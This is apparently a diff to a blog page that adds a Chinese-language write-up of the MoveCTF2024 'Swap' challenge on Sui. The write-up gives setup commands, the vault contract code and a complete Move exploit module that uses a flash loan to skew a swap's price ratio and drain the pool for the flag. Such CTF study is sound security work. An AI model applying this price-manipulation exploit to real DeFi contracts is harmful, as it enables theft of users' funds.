@@ -7,7 +7,9 @@
 <meta name="robots" content="index, follow">
 <title>MoveCTF2024_Swap | M4sk</title>
 <meta name="keywords" content="">
-<meta name="description" content="https://github.com/movebit/movectf2024-day1/tree/main/swap">
+<meta name="description" content="考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap
+环境搭建 部署后，先调用初始化函数
+#!/bin/bash PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&gt; a_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&#39; mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&gt; b_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&#39; sui client call --package $PackageID \ --module vault \ --function initialize \ --type-args $a_type $b_type \ --args $minta $mintb \ # public entry fun initialize&lt;A,B&gt;(capa: MintA&lt;A&gt;, capb: MintB&lt;B&gt;,ctx: &amp;mut TxContext) { # let vault = Vault&lt;A, B&gt; { # id: object::new(ctx), # coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), # coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), # flashed: false # }; # transfer::share_object(vault); # } 初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB">
 <meta name="author" content="Theme PaperMod">
 <link rel="canonical" href="https://m4sk93.github.io/posts/movectf2024_swap/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
@@ -55,7 +57,9 @@
 
     </style>
 </noscript><meta property="og:title" content="MoveCTF2024_Swap" />
-<meta property="og:description" content="https://github.com/movebit/movectf2024-day1/tree/main/swap" />
+<meta property="og:description" content="考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap
+环境搭建 部署后，先调用初始化函数
+#!/bin/bash PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&gt; a_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&#39; mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&gt; b_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&#39; sui client call --package $PackageID \ --module vault \ --function initialize \ --type-args $a_type $b_type \ --args $minta $mintb \ # public entry fun initialize&lt;A,B&gt;(capa: MintA&lt;A&gt;, capb: MintB&lt;B&gt;,ctx: &amp;mut TxContext) { # let vault = Vault&lt;A, B&gt; { # id: object::new(ctx), # coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), # coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), # flashed: false # }; # transfer::share_object(vault); # } 初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://m4sk93.github.io/posts/movectf2024_swap/" />
 <meta property="og:image" content="https://m4sk93.github.io/images/papermod-cover.png" />
@@ -66,7 +70,9 @@
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://m4sk93.github.io/images/papermod-cover.png" />
 <meta name="twitter:title" content="MoveCTF2024_Swap"/>
-<meta name="twitter:description" content="https://github.com/movebit/movectf2024-day1/tree/main/swap"/>
+<meta name="twitter:description" content="考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap
+环境搭建 部署后，先调用初始化函数
+#!/bin/bash PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&gt; a_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&#39; mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&gt; b_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&#39; sui client call --package $PackageID \ --module vault \ --function initialize \ --type-args $a_type $b_type \ --args $minta $mintb \ # public entry fun initialize&lt;A,B&gt;(capa: MintA&lt;A&gt;, capb: MintB&lt;B&gt;,ctx: &amp;mut TxContext) { # let vault = Vault&lt;A, B&gt; { # id: object::new(ctx), # coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), # coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), # flashed: false # }; # transfer::share_object(vault); # } 初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB"/>
 
 
 <script type="application/ld+json">
@@ -95,12 +101,12 @@
   "@type": "BlogPosting",
   "headline": "MoveCTF2024_Swap",
   "name": "MoveCTF2024_Swap",
-  "description": "https://github.com/movebit/movectf2024-day1/tree/main/swap",
+  "description": "考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap\n环境搭建 部署后，先调用初始化函数\n#!/bin/bash PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA\u0026lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA\u0026gt; a_type=\u0026#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA\u0026#39; mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB\u0026lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB\u0026gt; b_type=\u0026#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB\u0026#39; sui client call --package $PackageID \\ --module vault \\ --function initialize \\ --type-args $a_type $b_type \\ --args $minta $mintb \\ # public entry fun initialize\u0026lt;A,B\u0026gt;(capa: MintA\u0026lt;A\u0026gt;, capb: MintB\u0026lt;B\u0026gt;,ctx: \u0026amp;mut TxContext) { # let vault = Vault\u0026lt;A, B\u0026gt; { # id: object::new(ctx), # coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), # coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), # flashed: false # }; # transfer::share_object(vault); # } 初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB",
   "keywords": [
     
   ],
-  "articleBody": "https://github.com/movebit/movectf2024-day1/tree/main/swap\n",
-  "wordCount" : "1",
+  "articleBody": "考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap\n环境搭建 部署后，先调用初始化函数\n#!/bin/bash PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA\u003c0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA\u003e a_type='0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA' mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB\u003c0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB\u003e b_type='0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB' sui client call --package $PackageID \\ --module vault \\ --function initialize \\ --type-args $a_type $b_type \\ --args $minta $mintb \\ # public entry fun initialize(capa: MintA, capb: MintB,ctx: \u0026mut TxContext) { # let vault = Vault { # id: object::new(ctx), # coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), # coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), # flashed: false # }; # transfer::share_object(vault); # } 初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB\n分析 题目要求把资金池抽干\npublic fun get_flag(vault: \u0026Vault, ctx: \u0026TxContext) { assert!( balance::value(\u0026vault.coin_a) == 0 \u0026\u0026 balance::value(\u0026vault.coin_b) == 0, 123 ); event::emit( Flag { win: true, sender: tx_context::sender(ctx) } ); } 交换时，按照资金池里两种token的比例进行兑换\npublic fun swap_a_to_b(vault: \u0026mut Vault, coina:Coin, ctx: \u0026mut TxContext): Coin { let amount_out_B = coin::value(\u0026coina) * balance::value(\u0026vault.coin_b) / balance::value(\u0026vault.coin_a); coin::put(\u0026mut vault.coin_a, coina); coin::take(\u0026mut vault.coin_b, amount_out_B, ctx) } 即output_B / intput_A = balance_B / balance_A\n使用闪电贷可以轻易的操纵这两种token的比例balance_B / balance_A\npublic fun flash(vault: \u0026mut Vault, amount: u64, a_to_b: bool, ctx: \u0026mut TxContext): (Coin, Coin, Receipt) { assert!(!vault.flashed, 1); let (coin_a, coin_b) = if (a_to_b) { (coin::zero(ctx), coin::from_balance(balance::split(\u0026mut vault.coin_b, amount ), ctx)) } else { (coin::from_balance(balance::split(\u0026mut vault.coin_a, amount ), ctx), coin::zero(ctx)) }; let receipt = Receipt { id: object::id(vault), a_to_b, repay_amount: amount }; vault.flashed = true; (coin_a, coin_b, receipt) } 利用 /// Module: exp module exp::exp { use sui::tx_context::TxContext; use sui::balance::{Self, Balance}; use sui::coin::{Self, Coin}; use swap::vault::{Self, Vault,swap_a_to_b}; public entry fun exp1(vault: \u0026mut Vault, coina:Coin, ctx: \u0026mut TxContext) { //in vault, A:100,B:100 //flashloan 99 coina let (coin_a, coin_b, receipt) = vault::flash(vault, 99, false, ctx); //in vault, A:1,B:100 let mut input_balance= coin::into_balance(coina);//10 let coinb = swap_a_to_b(vault,coin::from_balance(balance::split(\u0026mut input_balance,1),ctx), ctx); transfer::public_transfer(coinb, tx_context::sender(ctx)); let change = coin::from_balance(input_balance, ctx); transfer::public_transfer(change, tx_context::sender(ctx)); //in vault, A:2,B:0 //repay 99 coina vault::repay_flash(vault, coin_a, coin_b, receipt); //in vault, A:101,B:0 // flashloan all let (coin_a, coin_b, receipt) = vault::flash(vault, 101, false, ctx); vault::get_flag(vault, ctx); vault::repay_flash(vault, coin_a, coin_b, receipt); } } ",
+  "wordCount" : "301",
   "inLanguage": "en",
   "image": "https://m4sk93.github.io/images/papermod-cover.png","datePublished": "2024-06-03T01:46:20Z",
   "dateModified": "2024-06-03T01:46:20Z",
@@ -201,13 +207,138 @@
     <h1 class="post-title entry-hint-parent">
       MoveCTF2024_Swap
     </h1>
-    <div class="post-meta"><span title='2024-06-03 01:46:20 +0000 UTC'>June 3, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Theme PaperMod&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/MoveCTF2024_Swap.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+    <div class="post-meta"><span title='2024-06-03 01:46:20 +0000 UTC'>June 3, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Theme PaperMod&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/MoveCTF2024_Swap.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
 
 </div>
-  </header> 
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
 
-  <div class="post-content"><p><a href="https://github.com/movebit/movectf2024-day1/tree/main/swap">https://github.com/movebit/movectf2024-day1/tree/main/swap</a></p>
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="环境搭建">环境搭建</a></li>
+                <li>
+                    <a href="#%e5%88%86%e6%9e%90" aria-label="分析">分析</a></li>
+                <li>
+                    <a href="#%e5%88%a9%e7%94%a8" aria-label="利用">利用</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
 
+  <div class="post-content"><p>考察闪电贷
+题目源码 <a href="https://github.com/movebit/movectf2024-day1/tree/main/swap">https://github.com/movebit/movectf2024-day1/tree/main/swap</a></p>
+<h2 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h2>
+<p>部署后，先调用初始化函数</p>
+<pre tabindex="0"><code>#!/bin/bash
+
+PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a
+
+minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9
+#ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&gt;
+a_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA&#39;
+
+mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9
+#ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB&lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&gt;
+b_type=&#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB&#39;
+
+sui client call --package $PackageID \
+                --module vault \
+                --function initialize \
+                --type-args $a_type $b_type \
+                --args $minta $mintb \
+
+
+#    public entry fun initialize&lt;A,B&gt;(capa: MintA&lt;A&gt;, capb: MintB&lt;B&gt;,ctx: &amp;mut TxContext) {
+#        let vault = Vault&lt;A, B&gt; {
+#            id: object::new(ctx),
+#            coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)),
+#            coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)),
+#            flashed: false
+#        };
+#        transfer::share_object(vault);
+#    }
+</code></pre><p>初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB</p>
+<h2 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h2>
+<p>题目要求把资金池抽干</p>
+<pre tabindex="0"><code>    public fun get_flag&lt;A,B&gt;(vault: &amp;Vault&lt;A,B&gt;, ctx: &amp;TxContext) {
+        assert!(
+            balance::value(&amp;vault.coin_a) == 0 &amp;&amp; balance::value(&amp;vault.coin_b) == 0, 123
+        );
+        event::emit(
+            Flag {
+                win: true,
+                sender: tx_context::sender(ctx)
+            }
+        );
+    }
+</code></pre><p>交换时，按照资金池里两种token的比例进行兑换</p>
+<pre tabindex="0"><code>    public fun swap_a_to_b&lt;A,B&gt;(vault: &amp;mut Vault&lt;A,B&gt;, coina:Coin&lt;A&gt;, ctx: &amp;mut TxContext): Coin&lt;B&gt; {
+            let amount_out_B = coin::value(&amp;coina) * balance::value(&amp;vault.coin_b) / balance::value(&amp;vault.coin_a);
+            coin::put&lt;A&gt;(&amp;mut vault.coin_a, coina);
+            coin::take(&amp;mut vault.coin_b, amount_out_B, ctx)
+    }
+</code></pre><p>即<code>output_B / intput_A = balance_B / balance_A</code></p>
+<p>使用闪电贷可以轻易的操纵这两种token的比例<code>balance_B / balance_A</code></p>
+<pre tabindex="0"><code>    public fun flash&lt;A,B&gt;(vault: &amp;mut Vault&lt;A,B&gt;, amount: u64, a_to_b: bool, ctx: &amp;mut TxContext): (Coin&lt;A&gt;, Coin&lt;B&gt;, Receipt) {
+        assert!(!vault.flashed, 1);
+        let (coin_a, coin_b) = if (a_to_b) {
+        (coin::zero&lt;A&gt;(ctx), coin::from_balance(balance::split(&amp;mut vault.coin_b, amount ), ctx))
+        }
+        else {
+        (coin::from_balance(balance::split(&amp;mut vault.coin_a, amount ), ctx), coin::zero&lt;B&gt;(ctx))
+        };
+
+        let receipt = Receipt {
+            id: object::id(vault),
+            a_to_b,
+            repay_amount: amount
+        };
+        vault.flashed = true;
+
+        (coin_a, coin_b, receipt)
+
+    }
+</code></pre><h2 id="利用">利用<a hidden class="anchor" aria-hidden="true" href="#利用">#</a></h2>
+<pre tabindex="0"><code>/// Module: exp
+module exp::exp {
+
+    use sui::tx_context::TxContext;
+    use sui::balance::{Self, Balance};
+    use sui::coin::{Self, Coin};
+
+    use swap::vault::{Self, Vault,swap_a_to_b};
+
+    public entry fun exp1&lt;A,B&gt;(vault: &amp;mut Vault&lt;A,B&gt;, coina:Coin&lt;A&gt;, ctx: &amp;mut TxContext) {
+        //in vault, A:100,B:100
+
+        //flashloan 99 coina
+        let (coin_a, coin_b, receipt) = vault::flash(vault, 99, false, ctx);
+        //in vault, A:1,B:100
+
+        let mut input_balance= coin::into_balance(coina);//10
+        let coinb = swap_a_to_b(vault,coin::from_balance(balance::split(&amp;mut input_balance,1),ctx), ctx);
+        transfer::public_transfer(coinb, tx_context::sender(ctx));
+        let change = coin::from_balance(input_balance, ctx);
+        transfer::public_transfer(change, tx_context::sender(ctx));
+        //in vault, A:2,B:0
+
+
+        //repay 99 coina
+        vault::repay_flash(vault, coin_a, coin_b, receipt);
+        //in vault, A:101,B:0
+
+        // flashloan all
+        let (coin_a, coin_b, receipt) = vault::flash(vault, 101, false, ctx);
+
+        vault::get_flag(vault, ctx);
+        vault::repay_flash(vault, coin_a, coin_b, receipt);
+    }
+}
+</code></pre>
 
   </div>
 
